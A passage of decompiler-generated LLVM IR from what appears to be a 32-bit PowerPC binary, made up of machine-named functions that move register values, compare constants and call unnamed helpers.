  %v2_1000e428 = add i32 %v1_1000e428, %v0_1000e428
  %v3_1000e428 = inttoptr i32 %v2_1000e428 to i16*
  %v4_1000e428 = load i16, i16* %v3_1000e428, align 2
  %v5_1000e428 = sext i16 %v4_1000e428 to i32
  store i32 %v5_1000e428, i32* %r9.global-to-local, align 4
  %v2_1000e430 = add i32 %v1_1000e428, %v1_1000e420
  %v3_1000e430 = inttoptr i32 %v2_1000e430 to i16*
  %v4_1000e430 = load i16, i16* %v3_1000e430, align 2
  %v5_1000e430 = sext i16 %v4_1000e430 to i32
  store i32 %v5_1000e430, i32* %r0.global-to-local, align 4
  %v4_1000e434 = icmp eq i16 %v4_1000e428, %v4_1000e430
  br i1 %v4_1000e434, label %dec_label_pc_1000e400.backedge, label %dec_label_pc_1000e43c

dec_label_pc_1000e43c:                            ; preds = %dec_label_pc_1000e428
  %v3_1000e42c = icmp eq i8 %v2_1000e414, 0
  %v0_1000e43c = load i32, i32* %r3.global-to-local, align 4
  %v1_1000e43c = add i32 %v0_1000e43c, 1
  store i32 %v1_1000e43c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  store i32 %v1_1000e43c, i32* %r8.global-to-local, align 4
  br i1 %v3_1000e42c, label %dec_label_pc_1000e44c, label %dec_label_pc_1000e400.backedge

dec_label_pc_1000e44c:                            ; preds = %dec_label_pc_1000e43c
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1000e400, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e400.backedge, { 2, 1, 0 }
}

define i32 @function_1000e454(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000e454:
  store i32 ptrtoint (i32* @global_var_1002b938.735 to i32), i32* @r5, align 4
  %v1_1000e45c = call i32 @function_10011744(i32 ptrtoint (i32* @global_var_1002b938.735 to i32))
  ret i32 %v1_1000e45c
}

define i32 @function_1000e460(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000e460:
  %stack_var_-72 = alloca i32, align 4
  store i32 268493940, i32* @lr, align 4
  %v2_1000e470 = call i32 @function_1000e48c(i32* nonnull %stack_var_-72)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32*)* @function_1000e48c, { 1, 0 }
}

define i32 @function_1000e48c(i32* %arg1) local_unnamed_addr {
dec_label_pc_1000e48c:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_4()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000e490 = load i32, i32* @lr, align 4
  store i32 %v0_1000e490, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000e4a0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268494004, i32* @lr, align 4
  %v3_1000e4b0 = call i32 @function_1000c048(i32 1076655123, i32 %v2_1000e4a0, i32 %v2_1000e4a0)
  %v2_1000e4b4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000e4b4, i32* @r4, align 4
  store i32 %v3_1000e4b0, i32* @r30, align 4
  %v3_1000e4b8 = icmp eq i32 %v3_1000e4b0, 0
  store i32 19, i32* @r5, align 4
  %v0_1000e4c0 = load i32, i32* @r31, align 4
  br i1 %v3_1000e4b8, label %dec_label_pc_1000e4c8, label %dec_label_pc_1000e510

dec_label_pc_1000e4c8:                            ; preds = %dec_label_pc_1000e48c
  %v1_1000e4c0 = add i32 %v0_1000e4c0, 17
  %v3_1000e4e0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1000e4e0, i32* %r0.global-to-local, align 4
  %v2_1000e4e4 = add i32 %v0_1000e4c0, 4
  %v3_1000e4e4 = inttoptr i32 %v2_1000e4e4 to i32*
  store i32 %tmp7, i32* %v3_1000e4e4, align 4
  %v0_1000e4e8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e4e8 = load i32, i32* @r31, align 4
  %v2_1000e4e8 = add i32 %v1_1000e4e8, 8
  %v3_1000e4e8 = inttoptr i32 %v2_1000e4e8 to i32*
  store i32 %v0_1000e4e8, i32* %v3_1000e4e8, align 4
  %v0_1000e4ec = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e4ec = load i32, i32* @r31, align 4
  %v2_1000e4ec = inttoptr i32 %v1_1000e4ec to i32*
  store i32 %v0_1000e4ec, i32* %v2_1000e4ec, align 4
  %v0_1000e4f0 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000e4f0 = load i32, i32* @r31, align 4
  %v2_1000e4f0 = add i32 %v1_1000e4f0, 12
  %v3_1000e4f0 = inttoptr i32 %v2_1000e4f0 to i32*
  store i32 %v0_1000e4f0, i32* %v3_1000e4f0, align 4
  %v3_1000e4f4 = load i32, i32* @r31, align 4
  %v4_1000e4f4 = add i32 %v3_1000e4f4, 16
  %v5_1000e4f4 = inttoptr i32 %v4_1000e4f4 to i8*
  store i8 %tmp4, i8* %v5_1000e4f4, align 1
  %v1_1000e4f8 = load i32, i32* @r31, align 4
  %v2_1000e4f8 = add i32 %v1_1000e4f8, 52
  %v3_1000e4f8 = inttoptr i32 %v2_1000e4f8 to i32*
  store i32 %tmp3, i32* %v3_1000e4f8, align 4
  %v1_1000e4fc = load i32, i32* @r31, align 4
  %v2_1000e4fc = add i32 %v1_1000e4fc, 56
  %v3_1000e4fc = inttoptr i32 %v2_1000e4fc to i32*
  store i32 %tmp2, i32* %v3_1000e4fc, align 4
  store i32 268494084, i32* @lr, align 4
  %v6_1000e500 = sext i8 %tmp4 to i32
  %v8_1000e500 = call i32 @function_1001161c(i32 %v1_1000e4c0, i32 %v2_1000e4b4, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_1000e500, i32 %tmp7)
  store i32 268494096, i32* @lr, align 4
  %v3_1000e50c = call i32 @function_1000dd4c(i32 %v8_1000e500, i32 0, i32 13)
  %v0_1000e514.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000e510

dec_label_pc_1000e510:                            ; preds = %dec_label_pc_1000e48c, %dec_label_pc_1000e4c8
  %v0_1000e514 = phi i32 [ %v3_1000e4b0, %dec_label_pc_1000e48c ], [ %v0_1000e514.pre, %dec_label_pc_1000e4c8 ]
  store i32 %v0_1000e490, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000e514

; uselistorder directives
  uselistorder i32 %v2_1000e4a0, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder label %dec_label_pc_1000e510, { 1, 0 }
}

define i32 @function_1000e528() local_unnamed_addr {
dec_label_pc_1000e528:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000e530 = load i32, i32* @r4, align 4
  %v3_1000e530 = icmp eq i32 %v0_1000e530, 1
  %v0_1000e538 = load i32, i32* @r3, align 4
  store i32 %v0_1000e538, i32* @r27, align 4
  %v0_1000e540 = load i32, i32* @r5, align 4
  store i32 %v0_1000e540, i32* @r31, align 4
  br i1 %v3_1000e530, label %dec_label_pc_1000e564, label %dec_label_pc_1000e548

dec_label_pc_1000e548:                            ; preds = %dec_label_pc_1000e528
  %v3_1000e548 = icmp eq i32 %v0_1000e530, 2
  br i1 %v3_1000e548, label %dec_label_pc_1000e584, label %dec_label_pc_1000e550

dec_label_pc_1000e550:                            ; preds = %dec_label_pc_1000e548
  %v3_1000e550 = icmp eq i32 %v0_1000e530, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_1000e550, label %dec_label_pc_1000e58c, label %dec_label_pc_1000e570

dec_label_pc_1000e564:                            ; preds = %dec_label_pc_1000e528
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_1000e58c

dec_label_pc_1000e570:                            ; preds = %dec_label_pc_1000e550
  %v0_1000e570 = call i32 @function_1000c85c()
  store i32 -1, i32* @r28, align 4
  %v2_1000e57c = inttoptr i32 %v0_1000e570 to i32*
  store i32 22, i32* %v2_1000e57c, align 4
  br label %dec_label_pc_1000e674

dec_label_pc_1000e584:                            ; preds = %dec_label_pc_1000e548
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_1000e58c

dec_label_pc_1000e58c:                            ; preds = %dec_label_pc_1000e550, %dec_label_pc_1000e564, %dec_label_pc_1000e584
  %v1_1000e58c = inttoptr i32 %v0_1000e540 to i32*
  %v2_1000e58c = load i32, i32* %v1_1000e58c, align 4
  store i32 19, i32* @r5, align 4
  %v1_1000e594 = add i32 %v0_1000e540, 4
  %v2_1000e594 = inttoptr i32 %v1_1000e594 to i32*
  %v3_1000e594 = load i32, i32* %v2_1000e594, align 4
  store i32 %v3_1000e594, i32* %r9.global-to-local, align 4
  %v1_1000e598 = add i32 %v0_1000e540, 17
  store i32 %v1_1000e598, i32* @r4, align 4
  %v1_1000e59c = add i32 %v0_1000e540, 8
  %v2_1000e59c = inttoptr i32 %v1_1000e59c to i32*
  %v3_1000e59c = load i32, i32* %v2_1000e59c, align 4
  %v2_1000e5a0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000e5a0, i32* @r3, align 4
  %v2_1000e5a8 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1000e5a8, i32* @r26, align 4
  store i32 %v2_1000e58c, i32* %stack_var_-72, align 4
  store i32 268494296, i32* @lr, align 4
  %v0_1000e5d4 = call i32 @function_1000dcb0()
  %v0_1000e5d8 = load i32, i32* @r27, align 4
  %v0_1000e5dc = load i32, i32* @r30, align 4
  store i32 268494316, i32* @lr, align 4
  %v3_1000e5e8 = call i32 @function_1000c048(i32 %v0_1000e5d8, i32 %v0_1000e5dc, i32 %v2_1000e5a8)
  store i32 %v3_1000e5e8, i32* @r28, align 4
  %v3_1000e5ec = icmp eq i32 %v3_1000e5e8, 0
  br i1 %v3_1000e5ec, label %dec_label_pc_1000e5f4, label %dec_label_pc_1000e674

dec_label_pc_1000e5f4:                            ; preds = %dec_label_pc_1000e58c
  %v0_1000e5f4 = load i32, i32* @r30, align 4
  %v3_1000e5f8 = icmp eq i32 %v0_1000e5f4, -2144570348
  br i1 %v3_1000e5f8, label %dec_label_pc_1000e600, label %dec_label_pc_1000e670

dec_label_pc_1000e600:                            ; preds = %dec_label_pc_1000e5f4
  %v0_1000e600 = call i32 @function_1000c85c()
  store i32 %v0_1000e600, i32* @r29, align 4
  %v0_1000e610 = load i32, i32* @r27, align 4
  %v1_1000e618 = inttoptr i32 %v0_1000e600 to i32*
  %v2_1000e618 = load i32, i32* %v1_1000e618, align 4
  store i32 %v2_1000e618, i32* @r30, align 4
  store i32 268494372, i32* @lr, align 4
  %v3_1000e620 = call i32 @function_1000c048(i32 %v0_1000e610, i32 1076655123, i32 %v2_1000e5a8)
  %v3_1000e624 = icmp eq i32 %v3_1000e620, 0
  br i1 %v3_1000e624, label %dec_label_pc_1000e634, label %dec_label_pc_1000e62c

dec_label_pc_1000e62c:                            ; preds = %dec_label_pc_1000e600
  %v0_1000e62c = load i32, i32* @r30, align 4
  %v1_1000e62c = load i32, i32* @r29, align 4
  %v2_1000e62c = inttoptr i32 %v1_1000e62c to i32*
  store i32 %v0_1000e62c, i32* %v2_1000e62c, align 4
  br label %dec_label_pc_1000e674

dec_label_pc_1000e634:                            ; preds = %dec_label_pc_1000e600
  %v0_1000e634 = load i32, i32* @r31, align 4
  %v1_1000e634 = add i32 %v0_1000e634, 8
  %v2_1000e634 = inttoptr i32 %v1_1000e634 to i32*
  %v3_1000e634 = load i32, i32* %v2_1000e634, align 4
  %v1_1000e63c = call i32 @__asm_rlwinm(i32 %v3_1000e634, i32 0, i32 19, i32 20)
  %v1_1000e640 = call i32 @__asm_rlwinm(i32 %v3_1000e59c, i32 0, i32 19, i32 20)
  store i32 %v1_1000e640, i32* %r9.global-to-local, align 4
  %v4_1000e644 = icmp eq i32 %v1_1000e63c, %v1_1000e640
  br i1 %v4_1000e644, label %dec_label_pc_1000e64c, label %dec_label_pc_1000e660

dec_label_pc_1000e64c:                            ; preds = %dec_label_pc_1000e634
  %v1_1000e64c = and i32 %v3_1000e634, 768
  store i32 %v1_1000e64c, i32* %r9.global-to-local, align 4
  %v3_1000e64c = icmp eq i32 %v1_1000e64c, 0
  br i1 %v3_1000e64c, label %dec_label_pc_1000e670, label %dec_label_pc_1000e654

dec_label_pc_1000e654:                            ; preds = %dec_label_pc_1000e64c
  %v1_1000e654 = call i32 @__asm_rlwinm(i32 %v3_1000e59c, i32 0, i32 22, i32 23)
  %v0_1000e658 = load i32, i32* %r9.global-to-local, align 4
  %v4_1000e658 = icmp eq i32 %v0_1000e658, %v1_1000e654
  br i1 %v4_1000e658, label %dec_label_pc_1000e670, label %dec_label_pc_1000e660

dec_label_pc_1000e660:                            ; preds = %dec_label_pc_1000e634, %dec_label_pc_1000e654
  store i32 -1, i32* @r28, align 4
  %v1_1000e668 = load i32, i32* @r29, align 4
  %v2_1000e668 = inttoptr i32 %v1_1000e668 to i32*
  store i32 22, i32* %v2_1000e668, align 4
  br label %dec_label_pc_1000e674

dec_label_pc_1000e670:                            ; preds = %dec_label_pc_1000e5f4, %dec_label_pc_1000e654, %dec_label_pc_1000e64c
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000e674

dec_label_pc_1000e674:                            ; preds = %dec_label_pc_1000e58c, %dec_label_pc_1000e62c, %dec_label_pc_1000e570, %dec_label_pc_1000e660, %dec_label_pc_1000e670
  %v0_1000e678 = load i32, i32* @r28, align 4
  ret i32 %v0_1000e678

; uselistorder directives
  uselistorder i32 %v0_1000e540, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r9.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @function_1000c048, { 2, 1, 0, 3 }
  uselistorder i32 19, { 5, 6, 7, 0, 8, 3, 4, 1, 2 }
  uselistorder label %dec_label_pc_1000e674, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e670, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000e660, { 1, 0 }
  uselistorder label %dec_label_pc_1000e58c, { 2, 1, 0 }
}

define i32 @function_1000e68c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000e68c:
  %v0_1000e68c = load i32, i32* @r3, align 4
  ret i32 %v0_1000e68c
}

define i32 @function_1000e694(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000e694:
  %v0_1000e694 = load i32, i32* @r3, align 4
  ret i32 %v0_1000e694
}

define i32 @function_1000e698(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000e698:
  %v0_1000e698 = load i32, i32* @r3, align 4
  ret i32 %v0_1000e698
}

define i32 @function_1000e69c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000e69c:
  %v2_1000e69c = icmp ugt i32 %arg1, 4
  br i1 %v2_1000e69c, label %dec_label_pc_1000e6bc, label %dec_label_pc_1000e6b0

dec_label_pc_1000e6b0:                            ; preds = %dec_label_pc_1000e69c
  %v1_1000e6a8 = mul i32 %arg1, 4
  %v2_1000e6b8 = add i32 %v1_1000e6a8, ptrtoint ([5 x i8*]* @global_var_1001a0fc.742 to i32)
  %v3_1000e6b8 = inttoptr i32 %v2_1000e6b8 to i32*
  %v4_1000e6b8 = load i32, i32* %v3_1000e6b8, align 4
  br label %dec_label_pc_1000e6bc

dec_label_pc_1000e6bc:                            ; preds = %dec_label_pc_1000e69c, %dec_label_pc_1000e6b0
  %v0_1000e6bc = phi i32 [ ptrtoint ([15 x i8]* @global_var_1001a110.736 to i32), %dec_label_pc_1000e69c ], [ %v4_1000e6b8, %dec_label_pc_1000e6b0 ]
  ret i32 %v0_1000e6bc

; uselistorder directives
  uselistorder label %dec_label_pc_1000e6bc, { 1, 0 }
}

define i32 @function_1000e6c4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000e6c4:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000e6c8 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v4_1000e6d0 = icmp eq i8* %arg1, null
  br i1 %v4_1000e6d0, label %dec_label_pc_1000e6f0, label %dec_label_pc_1000e6dc

dec_label_pc_1000e6dc:                            ; preds = %dec_label_pc_1000e6c4
  %v2_1000e6dc = load i8, i8* %arg1, align 1
  %v3_1000e6e8 = icmp eq i8 %v2_1000e6dc, 0
  br i1 %v3_1000e6e8, label %dec_label_pc_1000e6f0, label %dec_label_pc_1000e6f8

dec_label_pc_1000e6f0:                            ; preds = %dec_label_pc_1000e6dc, %dec_label_pc_1000e6c4
  br label %dec_label_pc_1000e6f8

dec_label_pc_1000e6f8:                            ; preds = %dec_label_pc_1000e6dc, %dec_label_pc_1000e6f0
  %storemerge = phi i32 [ ptrtoint (i32* @global_var_1001a122.744 to i32), %dec_label_pc_1000e6f0 ], [ ptrtoint ([3 x i8]* @global_var_1001a120.743 to i32), %dec_label_pc_1000e6dc ]
  store i32 %storemerge, i32* %r30.global-to-local, align 4
  %v0_1000e6f8 = call i32 @function_1001063c()
  %v1_1000e700 = inttoptr i32 %v0_1000e6f8 to i32*
  %v2_1000e700 = load i32, i32* %v1_1000e700, align 4
  %v2_1000e708 = icmp ugt i32 %v2_1000e700, 4
  br i1 %v2_1000e708, label %dec_label_pc_1000e720, label %dec_label_pc_1000e714

dec_label_pc_1000e714:                            ; preds = %dec_label_pc_1000e6f8
  br label %dec_label_pc_1000e720

dec_label_pc_1000e720:                            ; preds = %dec_label_pc_1000e6f8, %dec_label_pc_1000e714
  %v3_1000e728 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -18220) to i32*), align 4
  store i32 %v3_1000e728, i32* @r3, align 4
  %v0_1000e730 = load i32, i32* %r31.global-to-local, align 4
  %v0_1000e734 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000e6c8, i32* @lr, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1001a088.745 to i32), i32* @r4, align 4
  %v8_1000e74c = call i32 @function_10010780(i32 %v3_1000e728, i32 ptrtoint ([8 x i8]* @global_var_1001a088.745 to i32), i32 %v0_1000e730, i32 %v0_1000e734, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  ret i32 %v8_1000e74c

; uselistorder directives
  uselistorder i32* %r30.global-to-local, { 1, 0 }
  uselistorder label %dec_label_pc_1000e720, { 1, 0 }
  uselistorder label %dec_label_pc_1000e6f8, { 1, 0 }
}

define i32 @function_1000e750(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000e750:
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_1000e758 = add i32 %arg2, 15
  store i32 %v1_1000e758, i32* %r4.global-to-local, align 4
  %v2_1000e76c = load i32, i32* %arg1, align 4
  store i32 %v2_1000e76c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e774

dec_label_pc_1000e774:                            ; preds = %dec_label_pc_1000e798.dec_label_pc_1000e774_crit_edge, %dec_label_pc_1000e750
  %v0_1000e774 = phi i32 [ %v2_1000e76c, %dec_label_pc_1000e750 ], [ %v0_1000e774.pre, %dec_label_pc_1000e798.dec_label_pc_1000e774_crit_edge ]
  %v0_1000e7b88 = phi i32 [ %v1_1000e758, %dec_label_pc_1000e750 ], [ %v0_1000e798, %dec_label_pc_1000e798.dec_label_pc_1000e774_crit_edge ]
  %v1_1000e774 = urem i32 %v0_1000e774, 256
  %v5_1000e77c = inttoptr i32 %v0_1000e7b88 to i8*
  %v6_1000e77c = call i32 @function_10010c00(i8* %v5_1000e77c, i32 0, i32 %v1_1000e774, i32 -10, i32 0)
  %v0_1000e780 = load i32, i32* @r31, align 4
  %v1_1000e780 = udiv i32 %v0_1000e780, 256
  store i32 %v1_1000e780, i32* %r31.global-to-local, align 4
  %v0_1000e784 = load i32, i32* @r30, align 4
  %v3_1000e784 = icmp eq i32 %v0_1000e784, 0
  %v1_1000e788 = add i32 %v6_1000e77c, -1
  store i32 %v1_1000e788, i32* %r4.global-to-local, align 4
  br i1 %v3_1000e784, label %dec_label_pc_1000e798, label %dec_label_pc_1000e790

dec_label_pc_1000e790:                            ; preds = %dec_label_pc_1000e774
  %v3_1000e794 = inttoptr i32 %v0_1000e784 to i8*
  store i8 46, i8* %v3_1000e794, align 1
  %v0_1000e798.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000e798

dec_label_pc_1000e798:                            ; preds = %dec_label_pc_1000e774, %dec_label_pc_1000e790
  %v0_1000e798 = phi i32 [ %v1_1000e788, %dec_label_pc_1000e774 ], [ %v0_1000e798.pre, %dec_label_pc_1000e790 ]
  %v0_1000e79c.pre = load i32, i32* @r29, align 4
  %v1_1000e7ac = add i32 %v0_1000e79c.pre, 1
  store i32 %v1_1000e7ac, i32* @r29, align 4
  %tmp7 = icmp slt i32 %v0_1000e79c.pre, 4
  br i1 %tmp7, label %dec_label_pc_1000e798.dec_label_pc_1000e774_crit_edge, label %dec_label_pc_1000e7b4

dec_label_pc_1000e798.dec_label_pc_1000e774_crit_edge: ; preds = %dec_label_pc_1000e798
  %v0_1000e774.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e774

dec_label_pc_1000e7b4:                            ; preds = %dec_label_pc_1000e798
  %v1_1000e7b8 = add i32 %v0_1000e798, 1
  ret i32 %v1_1000e7b8

; uselistorder directives
  uselistorder i32 %v0_1000e79c.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @function_10010c00, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e798, { 1, 0 }
}

define i32 @function_1000e7cc(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000e7cc:
  %stack_var_-8 = alloca i32, align 4
  %v2_1000e7e0 = load i32, i32* %arg1, align 4
  store i32 %v2_1000e7e0, i32* %stack_var_-8, align 4
  store i32 268494832, i32* @lr, align 4
  %v3_1000e7ec = call i32 @function_1000e750(i32* nonnull %stack_var_-8, i32 ptrtoint (i32* @global_var_10031998.746 to i32))
  ret i32 %v3_1000e7ec
}

define i32 @function_1000e800(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000e800:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000e808 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000e808, i32* @r4, align 4
  store i32 268494868, i32* @lr, align 4
  %v1_1000e810 = bitcast i32* %stack_var_-24 to i8*
  %v2_1000e810 = call i32 @function_10011820(i8* %v1_1000e810)
  %v3_1000e814 = icmp eq i32 %v2_1000e810, 0
  br i1 %v3_1000e814, label %dec_label_pc_1000e824, label %dec_label_pc_1000e820

dec_label_pc_1000e820:                            ; preds = %dec_label_pc_1000e800
  %v3_1000e820 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000e824

dec_label_pc_1000e824:                            ; preds = %dec_label_pc_1000e800, %dec_label_pc_1000e820
  %v0_1000e830 = phi i32 [ -1, %dec_label_pc_1000e800 ], [ %v3_1000e820, %dec_label_pc_1000e820 ]
  ret i32 %v0_1000e830

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e824, { 1, 0 }
}

define i32 @function_1000e834(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000e834:
  %stack_var_-40 = alloca i32, align 4
  %v0_1000e848 = call i32 @function_1001063c()
  %v2_1000e858 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268494960, i32* @lr, align 4
  %v7_1000e86c = call i32 @function_1000e888(i32 %arg1, i32* nonnull @global_var_10031b74.747, i32 ptrtoint (i32* @global_var_100319a8.748 to i32), i32 460, i32 %v2_1000e858, i32 %v0_1000e848)
  %v3_1000e874 = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_1000e874
}

define i32 @function_1000e888(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1000e888:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v0_1000e88c = load i32, i32* @lr, align 4
  store i32 %v0_1000e88c, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r23, align 4
  %v3_1000e894 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r31, align 4
  store i32 %arg5, i32* %r20.global-to-local, align 4
  store i32 %tmp, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* %r29.global-to-local, align 4
  store i32 %arg6, i32* @r24, align 4
  %v2_1000e8b4 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_1000e8b4, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  br i1 %v3_1000e894, label %dec_label_pc_1000ebb8, label %dec_label_pc_1000e8c0

dec_label_pc_1000e8c0:                            ; preds = %dec_label_pc_1000e888
  %v0_1000e8c0 = call i32 @function_1000c85c()
  store i32 %v0_1000e8c0, i32* %r3.global-to-local, align 4
  %v1_1000e8c8 = inttoptr i32 %v0_1000e8c0 to i32*
  %v2_1000e8c8 = load i32, i32* %v1_1000e8c8, align 4
  store i32 %v2_1000e8c8, i32* @r27, align 4
  store i32 %v0_1000e8c0, i32* %r28.global-to-local, align 4
  %v0_1000e8d0 = load i32, i32* @r31, align 4
  store i32 %v0_1000e8d0, i32* %v1_1000e8c8, align 4
  %v0_1000e8d4 = load i32, i32* %r26.global-to-local, align 4
  %v0_1000e8d8 = load i32, i32* @r23, align 4
  store i32 %v0_1000e8d8, i32* %r3.global-to-local, align 4
  %v0_1000e8dc = load i32, i32* %r30.global-to-local, align 4
  %v0_1000e8e0 = load i32, i32* %r29.global-to-local, align 4
  %v0_1000e8e4 = load i32, i32* %r20.global-to-local, align 4
  %v0_1000e8e8 = load i32, i32* @r24, align 4
  store i32 268495088, i32* @lr, align 4
  %v7_1000e8ec = call i32 @function_10012250(i32 %v0_1000e8d8, i32 2, i32 %v0_1000e8d4, i32 %v0_1000e8dc, i32 %v0_1000e8e0, i32 %v0_1000e8e4, i32 %v0_1000e8e8)
  store i32 %v7_1000e8ec, i32* %r3.global-to-local, align 4
  %v3_1000e8f0 = icmp eq i32 %v7_1000e8ec, 0
  br i1 %v3_1000e8f0, label %dec_label_pc_1000ebb8, label %dec_label_pc_1000e8f8

dec_label_pc_1000e8f8:                            ; preds = %dec_label_pc_1000e8c0
  %v0_1000e8f8 = load i32, i32* @r24, align 4
  %v1_1000e8f8 = inttoptr i32 %v0_1000e8f8 to i32*
  %v2_1000e8f8 = load i32, i32* %v1_1000e8f8, align 4
  store i32 %v2_1000e8f8, i32* %r0.global-to-local, align 4
  %v3_1000e8fc = icmp eq i32 %v2_1000e8f8, 1
  br i1 %v3_1000e8fc, label %dec_label_pc_1000e920, label %dec_label_pc_1000e904

dec_label_pc_1000e904:                            ; preds = %dec_label_pc_1000e8f8
  %v3_1000e904 = icmp eq i32 %v2_1000e8f8, 4
  br i1 %v3_1000e904, label %dec_label_pc_1000e920, label %dec_label_pc_1000e90c

dec_label_pc_1000e90c:                            ; preds = %dec_label_pc_1000e904
  %v3_1000e90c = icmp eq i32 %v2_1000e8f8, -1
  br i1 %v3_1000e90c, label %dec_label_pc_1000e914, label %dec_label_pc_1000ebb8

dec_label_pc_1000e914:                            ; preds = %dec_label_pc_1000e90c
  %v0_1000e914 = load i32, i32* @r28, align 4
  %v1_1000e914 = inttoptr i32 %v0_1000e914 to i32*
  %v2_1000e914 = load i32, i32* %v1_1000e914, align 4
  store i32 %v2_1000e914, i32* %r0.global-to-local, align 4
  %v3_1000e918 = icmp eq i32 %v2_1000e914, 2
  br i1 %v3_1000e918, label %dec_label_pc_1000e920, label %dec_label_pc_1000ebb8

dec_label_pc_1000e920:                            ; preds = %dec_label_pc_1000e914, %dec_label_pc_1000e904, %dec_label_pc_1000e8f8
  %v0_1000e920 = load i32, i32* @r30, align 4
  %v1_1000e920 = sub i32 0, %v0_1000e920
  store i32 %v1_1000e920, i32* %r0.global-to-local, align 4
  %v0_1000e924 = load i32, i32* @r27, align 4
  %v1_1000e924 = load i32, i32* @r28, align 4
  %v2_1000e924 = inttoptr i32 %v1_1000e924 to i32*
  store i32 %v0_1000e924, i32* %v2_1000e924, align 4
